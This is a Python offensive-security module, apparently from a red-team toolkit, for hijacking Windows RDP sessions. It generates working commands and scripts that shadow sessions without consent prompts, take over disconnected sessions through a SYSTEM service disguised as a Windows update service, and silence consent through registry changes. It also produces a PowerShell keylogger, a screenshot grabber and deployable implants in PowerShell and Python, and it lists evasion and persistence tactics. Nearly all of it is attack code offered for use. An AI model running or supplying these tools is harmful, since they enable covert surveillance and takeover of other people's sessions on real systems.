#!/usr/bin/env python3
"""
RDP Hijacking - Shadow Session Module
Connect to Active RDP Sessions Without User Knowing

Kullanıcının ruhu duymadan mevcut RDP oturumuna bağlan.
Oturumu kapatmadan izle veya kontrol et!

Author: Monolith RED Team
Date: February 2025
"""

import secrets
import base64
import struct
import json
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime
import threading


class SessionState(Enum):
    """RDP Session States"""
    ACTIVE = "active"               # User actively connected
    DISCONNECTED = "disconnected"   # Session exists but no connection
    IDLE = "idle"                   # Connected but inactive
    LISTEN = "listen"               # Listening for connections
    SHADOW = "shadow"               # Being shadowed
    UNKNOWN = "unknown"


class HijackMode(Enum):
    """Shadow Session Modes"""
    VIEW_ONLY = "view"              # Only view, no control
    FULL_CONTROL = "control"        # Full mouse/keyboard control
    VIEW_WITH_CONSENT = "view_consent"    # View with user prompt
    CONTROL_WITH_CONSENT = "control_consent"  # Control with user prompt
    SILENT_VIEW = "silent_view"     # View without any notification
    SILENT_CONTROL = "silent_control"  # Control without notification (requires registry mod)


class PrivilegeLevel(Enum):
    """Required Privilege Level"""
    ADMIN = "admin"                 # Local admin
    SYSTEM = "system"               # NT AUTHORITY\SYSTEM
    SERVICE = "service"             # Service account
    DOMAIN_ADMIN = "domain_admin"   # Domain admin


@dataclass
class RDPSession:
    """Active RDP Session"""
    session_id: int
    username: str
    domain: str
    hostname: str
    client_ip: str
    client_name: str
    state: SessionState
    logon_time: str
    idle_time: int  # seconds
    protocol: str  # rdp-tcp, console, etc.
    is_admin: bool
    can_shadow: bool
    shadow_mode: Optional[HijackMode] = None


@dataclass
class HijackSession:
    """Hijack Session"""
    hijack_id: str
    target_session: RDPSession
    mode: HijackMode
    attacker_ip: str
    status: str
    connected_at: Optional[str] = None
    disconnected_at: Optional[str] = None
    keystrokes_captured: int = 0
    screenshots_taken: int = 0
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass 
class TargetMachine:
    """Target Machine for RDP Hijacking"""
    machine_id: str
    hostname: str
    ip_address: str
    os_version: str
    rdp_enabled: bool
    nla_enabled: bool
    shadow_allowed: bool
    sessions: List[RDPSession] = field(default_factory=list)
    discovered_at: str = field(default_factory=lambda: datetime.now().isoformat())


class RDPHijacker:
    """
    RDP Session Hijacker - Shadow Session Attack
    
    "Why crack passwords when you can just use their session?"
    
    Techniques:
    - Session shadowing (native Windows feature abuse)
    - tscon.exe session takeover
    - Service-based hijacking
    - Mimikatz ts::sessions
    """
    
    # Session query commands
    QWINSTA_CMD = "qwinsta /server:{server}"
    QUSER_CMD = "quser /server:{server}"
    
    # Shadow commands
    SHADOW_CMD = "mstsc /shadow:{session_id} /v:{server} /{mode}"
    TSCON_CMD = "tscon {session_id} /dest:{target_session} /password:{password}"
    
    # Registry keys for silent shadow
    SHADOW_REGISTRY = {
        "path": r"HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services",
        "values": {
            "Shadow": 2,  # 1=No shadow, 2=Full control no consent, 3=Full control with consent, 4=View only no consent
            "fSingleSessionPerUser": 0,
            "fPromptForPassword": 0
        }
    }
    
    def __init__(self, encryption_key: Optional[bytes] = None):
        self.encryption_key = encryption_key or secrets.token_bytes(32)
        self.targets: Dict[str, TargetMachine] = {}
        self.hijack_sessions: Dict[str, HijackSession] = {}
        self._lock = threading.Lock()
        
    def enumerate_sessions(self, target_host: str, 
                           credentials: Optional[Dict] = None) -> TargetMachine:
        """
        Enumerate RDP sessions on target
        
        Methods:
        - qwinsta (query user)
        - WMI Win32_LogonSession
        - CIM Instance
        - RPC
        """
        machine = TargetMachine(
            machine_id=secrets.token_hex(6),
            hostname=target_host,
            ip_address=target_host,  # Resolve in real impl
            os_version="Windows Server 2019",
            rdp_enabled=True,
            nla_enabled=True,
            shadow_allowed=True
        )
        
        # Simulated session enumeration
        sessions = self._query_sessions(target_host, credentials)
        machine.sessions = sessions
        
        with self._lock:
            self.targets[machine.machine_id] = machine
            
        return machine
        
    def _query_sessions(self, host: str, 
                        credentials: Optional[Dict]) -> List[RDPSession]:
        """Query sessions via qwinsta/WMI"""
        # Simulated active sessions
        return [
            RDPSession(
                session_id=1,
                username="Administrator",
                domain="CORP",
                hostname=host,
                client_ip="10.0.0.100",
                client_name="WORKSTATION1",
                state=SessionState.ACTIVE,
                logon_time="2025-02-01 08:30:00",
                idle_time=120,
                protocol="rdp-tcp",
                is_admin=True,
                can_shadow=True
            ),
            RDPSession(
                session_id=2,
                username="john.doe",
                domain="CORP",
                hostname=host,
                client_ip="10.0.0.101",
                client_name="LAPTOP-JOHN",
                state=SessionState.ACTIVE,
                logon_time="2025-02-01 09:15:00",
                idle_time=30,
                protocol="rdp-tcp",
                is_admin=False,
                can_shadow=True
            ),
            RDPSession(
                session_id=3,
                username="jane.admin",
                domain="CORP",
                hostname=host,
                client_ip="10.0.0.102",
                client_name="ADMIN-WS",
                state=SessionState.DISCONNECTED,
                logon_time="2025-02-01 07:00:00",
                idle_time=7200,
                protocol="rdp-tcp",
                is_admin=True,
                can_shadow=True
            )
        ]
        
    def shadow_session(self, machine_id: str, 
                       session_id: int,
                       mode: HijackMode = HijackMode.FULL_CONTROL) -> HijackSession:
        """
        Shadow an active RDP session
        
        Default Windows behavior:
        - Prompts user for consent
        - Shows notification in taskbar
        
        Silent shadow requires:
        - Registry modification OR
        - Group Policy change OR
        - SYSTEM privileges + specific technique
        """
        machine = self.targets.get(machine_id)
        if not machine:
            raise ValueError("Machine not found")
            
        target_session = None
        for sess in machine.sessions:
            if sess.session_id == session_id:
                target_session = sess
                break
                
        if not target_session:
            raise ValueError("Session not found")
            
        hijack = HijackSession(
            hijack_id=secrets.token_hex(6),
            target_session=target_session,
            mode=mode,
            attacker_ip="192.168.1.100",  # Attacker IP
            status="initiating",
            connected_at=datetime.now().isoformat()
        )
        
        with self._lock:
            self.hijack_sessions[hijack.hijack_id] = hijack
            
        return hijack
        
    def generate_shadow_command(self, machine: TargetMachine,
                                 session: RDPSession,
                                 mode: HijackMode) -> Dict[str, str]:
        """Generate shadow session commands"""
        commands = {}
        
        # Method 1: Native mstsc shadow
        shadow_flag = "control" if mode in [HijackMode.FULL_CONTROL, HijackMode.SILENT_CONTROL] else "noConsentPrompt"
        commands["mstsc_shadow"] = f"mstsc /shadow:{session.session_id} /v:{machine.hostname} /{shadow_flag}"
        
        # Method 2: PowerShell remoting
        commands["powershell_shadow"] = self._generate_ps_shadow(machine, session, mode)
        
        # Method 3: tscon takeover (disconnected sessions)
        if session.state == SessionState.DISCONNECTED:
            commands["tscon_takeover"] = f"tscon {session.session_id} /dest:console"
            
        # Method 4: Service-based hijacking
        commands["service_hijack"] = self._generate_service_hijack(machine, session)
        
        # Method 5: Mimikatz ts module
        commands["mimikatz"] = f"mimikatz # ts::sessions /server:{machine.hostname}"
        
        return commands
        
    def _generate_ps_shadow(self, machine: TargetMachine,
                            session: RDPSession,
                            mode: HijackMode) -> str:
        """Generate PowerShell shadow script"""
        return f'''
# RDP Shadow Session via PowerShell
$Server = "{machine.hostname}"
$SessionId = {session.session_id}
$Mode = "{mode.value}"

# Check shadow permission
$shadowMode = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" -Name "Shadow" -ErrorAction SilentlyContinue).Shadow

# Configure for silent shadow (requires admin)
if ($Mode -match "silent") {{
    Set-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" -Name "Shadow" -Value 4 -Type DWord
    Set-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" -Name "fPromptForPassword" -Value 0 -Type DWord
}}

# Initiate shadow
$process = Start-Process "mstsc.exe" -ArgumentList "/shadow:$SessionId /v:$Server /control" -PassThru

# Monitor session
Write-Host "[*] Shadowing session $SessionId on $Server..."
Write-Host "[*] User: {session.domain}\\{session.username}"
Write-Host "[*] Mode: $Mode"
'''

    def _generate_service_hijack(self, machine: TargetMachine,
                                  session: RDPSession) -> str:
        """Generate service-based hijack (for disconnected sessions)"""
        return f'''
# Service-based Session Hijack
# Creates a service running as SYSTEM to take over session

$serviceName = "WindowsUpdateService$(Get-Random)"
$serviceCmd = "cmd /c tscon {session.session_id} /dest:console"

# Create service
sc.exe \\\\{machine.hostname} create $serviceName binpath= $serviceCmd start= demand

# Start service (executes as SYSTEM)
sc.exe \\\\{machine.hostname} start $serviceName

# Cleanup
Start-Sleep 2
sc.exe \\\\{machine.hostname} delete $serviceName

# Result: Session {session.session_id} is now connected to your console!
'''

    def takeover_disconnected_session(self, machine_id: str,
                                       session_id: int) -> Dict:
        """
        Take over a disconnected session
        
        When a user disconnects (not logs off), session remains.
        With SYSTEM privileges, you can redirect it to your console!
        
        tscon.exe {session_id} /dest:console
        """
        machine = self.targets.get(machine_id)
        if not machine:
            return {"error": "Machine not found"}
            
        target_session = None
        for sess in machine.sessions:
            if sess.session_id == session_id:
                target_session = sess
                break
                
        if not target_session:
            return {"error": "Session not found"}
            
        if target_session.state != SessionState.DISCONNECTED:
            return {"error": "Session must be disconnected for takeover"}
            
        return {
            "attack": "Disconnected Session Takeover",
            "target": f"{target_session.domain}\\{target_session.username}",
            "session_id": session_id,
            "method": "tscon redirect",
            "commands": {
                "direct": f"tscon {session_id} /dest:console",
                "service_method": self._generate_service_hijack(machine, target_session),
                "psexec_method": f"psexec -s -i tscon {session_id} /dest:console",
                "sc_method": f"sc create hijack binpath= \"cmd /c tscon {session_id} /dest:console\" && sc start hijack"
            },
            "result": f"Session redirected to your console with {target_session.username}'s session!"
        }
        
    def enable_silent_shadow(self, target_host: str) -> Dict:
        """
        Modify registry to enable silent shadow (no user consent)
        
        Registry: HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services
        Shadow value:
        - 1: No remote control allowed
        - 2: Full Control with user's permission
        - 3: Full Control without user's permission
        - 4: View Session with user's permission
        - 5: View Session without user's permission
        """
        return {
            "attack": "Enable Silent Shadow",
            "target": target_host,
            "registry_changes": [
                {
                    "path": r"HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services",
                    "name": "Shadow",
                    "type": "REG_DWORD",
                    "value": 4,  # View without permission
                    "description": "Allow view-only shadow without user consent"
                },
                {
                    "path": r"HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services", 
                    "name": "fPromptForPassword",
                    "type": "REG_DWORD",
                    "value": 0,
                    "description": "Don't prompt for password"
                }
            ],
            "commands": {
                "powershell": '''
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" -Name "Shadow" -Value 4 -Type DWord
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" -Name "fPromptForPassword" -Value 0 -Type DWord
''',
                "reg_cmd": '''
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v fPromptForPassword /t REG_DWORD /d 0 /f
''',
                "wmic": f'''
wmic /node:"{target_host}" process call create "reg add \\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\\" /v Shadow /t REG_DWORD /d 4 /f"
'''
            },
            "gpo_alternative": "Computer Configuration > Policies > Administrative Templates > Windows Components > Remote Desktop Services > Remote Desktop Session Host > Connections > Set rules for remote control of Remote Desktop Services user sessions"
        }
        
    def capture_session_keystrokes(self, hijack_id: str) -> Dict:
        """
        Capture keystrokes from shadowed session
        
        When you shadow, you see everything the user types!
        This generates a keylogger for the shadow session.
        """
        hijack = self.hijack_sessions.get(hijack_id)
        if not hijack:
            return {"error": "Hijack session not found"}
            
        return {
            "hijack_id": hijack_id,
            "keylogger_code": self._generate_shadow_keylogger(),
            "screenshot_code": self._generate_screenshot_capture(),
            "description": "Capture all input from shadowed session"
        }
        
    def _generate_shadow_keylogger(self) -> str:
        """Generate keylogger for shadow session"""
        return '''
# Shadow Session Keylogger
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int vKey);
    
    [DllImport("user32.dll")]
    public static extern int GetKeyboardState(byte[] keystate);
    
    [DllImport("user32.dll")]
    public static extern int ToAscii(int uVirtKey, int uScanCode, byte[] lpKeyState, byte[] lpChar, int uFlags);
}
"@

$logPath = "$env:TEMP\\shadow_keys.log"

while ($true) {
    for ($i = 8; $i -lt 255; $i++) {
        $state = [KeyLogger]::GetAsyncKeyState($i)
        if ($state -eq -32767) {
            $key = [char]$i
            Add-Content $logPath "$(Get-Date -Format 'HH:mm:ss') - $key"
        }
    }
    Start-Sleep -Milliseconds 10
}
'''

    def _generate_screenshot_capture(self) -> str:
        """Generate screenshot capture for shadow session"""
        return '''
# Shadow Session Screenshot Capture
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Capture-Screen {
    param([string]$OutputPath)
    
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $bitmap.Save("$OutputPath\\shadow_$timestamp.png")
    
    $graphics.Dispose()
    $bitmap.Dispose()
}

# Capture every 30 seconds
while ($true) {
    Capture-Screen -OutputPath "$env:TEMP\\shadow_screenshots"
    Start-Sleep 30
}
'''

    def generate_implant(self, implant_type: str = "powershell") -> str:
        """Generate RDP hijacking implant"""
        
        if implant_type == "powershell":
            return '''
# RDP Hijacker Implant
$ErrorActionPreference = "SilentlyContinue"

function Get-RDPSessions {
    param([string]$Server = "localhost")
    
    $sessions = @()
    $qwinsta = qwinsta /server:$Server 2>&1
    
    foreach ($line in $qwinsta) {
        if ($line -match "rdp-tcp#\d+|console") {
            $parts = $line -split "\s+"
            $session = [PSCustomObject]@{
                SessionName = $parts[0].Trim(">")
                Username = $parts[1]
                SessionId = [int]$parts[2]
                State = $parts[3]
                IdleTime = $parts[4]
            }
            $sessions += $session
        }
    }
    return $sessions
}

function Shadow-Session {
    param(
        [string]$Server,
        [int]$SessionId,
        [switch]$Control,
        [switch]$Silent
    )
    
    if ($Silent) {
        # Enable silent shadow first
        Invoke-Command -ComputerName $Server -ScriptBlock {
            Set-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" -Name "Shadow" -Value 4
        }
    }
    
    $mode = if ($Control) { "/control" } else { "/noConsentPrompt" }
    Start-Process "mstsc.exe" -ArgumentList "/shadow:$SessionId /v:$Server $mode"
}

function Takeover-DisconnectedSession {
    param(
        [string]$Server,
        [int]$SessionId
    )
    
    # Create service to run tscon as SYSTEM
    $svcName = "WinSvc$(Get-Random)"
    $svcCmd = "cmd /c tscon $SessionId /dest:console"
    
    sc.exe \\\\$Server create $svcName binpath= $svcCmd start= demand
    sc.exe \\\\$Server start $svcName
    Start-Sleep 2
    sc.exe \\\\$Server delete $svcName
}

# Main - Enumerate and report
$localSessions = Get-RDPSessions
$localSessions | Format-Table -AutoSize

# Find disconnected admin sessions
$targets = $localSessions | Where-Object { $_.State -eq "Disc" }
foreach ($target in $targets) {
    Write-Host "[!] Disconnected session found: $($target.Username) (ID: $($target.SessionId))"
}
'''
        else:  # Python
            return '''
#!/usr/bin/env python3
"""RDP Hijacker Implant"""

import subprocess
import re
import ctypes
import os
from dataclasses import dataclass
from typing import List, Optional

@dataclass
class RDPSession:
    session_name: str
    username: str
    session_id: int
    state: str
    idle_time: str

class RDPHijacker:
    def __init__(self, target_server: str = "localhost"):
        self.target = target_server
        
    def enumerate_sessions(self) -> List[RDPSession]:
        """Enumerate RDP sessions"""
        cmd = f"qwinsta /server:{self.target}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        sessions = []
        for line in result.stdout.split("\\n")[1:]:
            if "rdp-tcp" in line or "console" in line:
                parts = line.split()
                if len(parts) >= 4:
                    sessions.append(RDPSession(
                        session_name=parts[0].lstrip(">"),
                        username=parts[1] if len(parts) > 1 else "",
                        session_id=int(parts[2]) if len(parts) > 2 else 0,
                        state=parts[3] if len(parts) > 3 else "",
                        idle_time=parts[4] if len(parts) > 4 else ""
                    ))
        return sessions
        
    def shadow_session(self, session_id: int, control: bool = True):
        """Shadow an active session"""
        mode = "/control" if control else ""
        cmd = f"mstsc /shadow:{session_id} /v:{self.target} {mode}"
        subprocess.Popen(cmd, shell=True)
        
    def takeover_disconnected(self, session_id: int):
        """Take over disconnected session via service"""
        import random
        svc_name = f"WinSvc{random.randint(1000,9999)}"
        
        # Create service
        subprocess.run(
            f'sc \\\\\\\\{self.target} create {svc_name} binpath= "cmd /c tscon {session_id} /dest:console" start= demand',
            shell=True
        )
        
        # Start service (runs as SYSTEM)
        subprocess.run(f'sc \\\\\\\\{self.target} start {svc_name}', shell=True)
        
        # Cleanup
        import time
        time.sleep(2)
        subprocess.run(f'sc \\\\\\\\{self.target} delete {svc_name}', shell=True)
        
    def enable_silent_shadow(self):
        """Modify registry for silent shadow"""
        key_path = r"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services"
        subprocess.run(f'reg add "{key_path}" /v Shadow /t REG_DWORD /d 4 /f', shell=True)
        subprocess.run(f'reg add "{key_path}" /v fPromptForPassword /t REG_DWORD /d 0 /f', shell=True)

if __name__ == "__main__":
    hijacker = RDPHijacker()
    sessions = hijacker.enumerate_sessions()
    
    print("[*] Active RDP Sessions:")
    for s in sessions:
        print(f"  [{s.session_id}] {s.username} - {s.state}")
        
    # Find disconnected sessions
    disconnected = [s for s in sessions if s.state == "Disc"]
    if disconnected:
        print("\\n[!] Disconnected sessions available for takeover!")
'''

    def get_attack_techniques(self) -> Dict:
        """Get all RDP hijacking techniques"""
        return {
            "techniques": [
                {
                    "name": "Session Shadowing",
                    "description": "Connect to active session as observer/controller",
                    "command": "mstsc /shadow:{id} /v:{server} /control",
                    "requirements": ["Admin on target", "Session shadow policy"],
                    "detection": "Event 4624 + Shadow notification"
                },
                {
                    "name": "Disconnected Session Takeover",
                    "description": "Redirect disconnected session to your console",
                    "command": "tscon {id} /dest:console",
                    "requirements": ["SYSTEM privileges"],
                    "detection": "Service creation, Event 4778"
                },
                {
                    "name": "Service-based Hijack",
                    "description": "Create service to run tscon as SYSTEM",
                    "command": "sc create... then sc start",
                    "requirements": ["Admin on target"],
                    "detection": "Service creation events"
                },
                {
                    "name": "Silent Shadow",
                    "description": "Shadow without user consent prompt",
                    "command": "Registry modification + mstsc",
                    "requirements": ["Admin on target", "Registry write"],
                    "detection": "Registry modification events"
                },
                {
                    "name": "Mimikatz ts Module",
                    "description": "Use mimikatz for session manipulation",
                    "command": "mimikatz # ts::sessions",
                    "requirements": ["SYSTEM or Admin"],
                    "detection": "Mimikatz signatures"
                }
            ],
            "defense_evasion": [
                "Use legitimate admin tools (mstsc, qwinsta)",
                "Clean up created services immediately",
                "Modify registry during off-hours",
                "Use existing admin sessions for shadow"
            ],
            "persistence": [
                "Scheduled task to check for disconnected sessions",
                "Service that shadows on admin login",
                "WMI event subscription for new RDP connections"
            ]
        }
        
    def get_session_stats(self) -> Dict:
        """Get hijacker statistics"""
        return {
            "targets_enumerated": len(self.targets),
            "total_sessions_found": sum(len(t.sessions) for t in self.targets.values()),
            "active_hijacks": len([h for h in self.hijack_sessions.values() if h.status == "connected"]),
            "hijack_history": len(self.hijack_sessions)
        }


# Singleton instance
_hijacker = None

def get_hijacker() -> RDPHijacker:
    """Get or create RDP Hijacker instance"""
    global _hijacker
    if _hijacker is None:
        _hijacker = RDPHijacker()
    return _hijacker


# Demo/Testing
if __name__ == "__main__":
    hijacker = RDPHijacker()
    
    # Enumerate sessions
    machine = hijacker.enumerate_sessions("dc01.corp.local")
    print(f"[+] Found {len(machine.sessions)} sessions on {machine.hostname}")
    
    for sess in machine.sessions:
        status = "⚠️ HIJACKABLE" if sess.state == SessionState.DISCONNECTED else "Active"
        print(f"    [{sess.session_id}] {sess.domain}\\{sess.username} - {sess.state.value} - {status}")
        
    # Get attack techniques
    techniques = hijacker.get_attack_techniques()
    print(f"\n[*] Available Techniques: {len(techniques['techniques'])}")
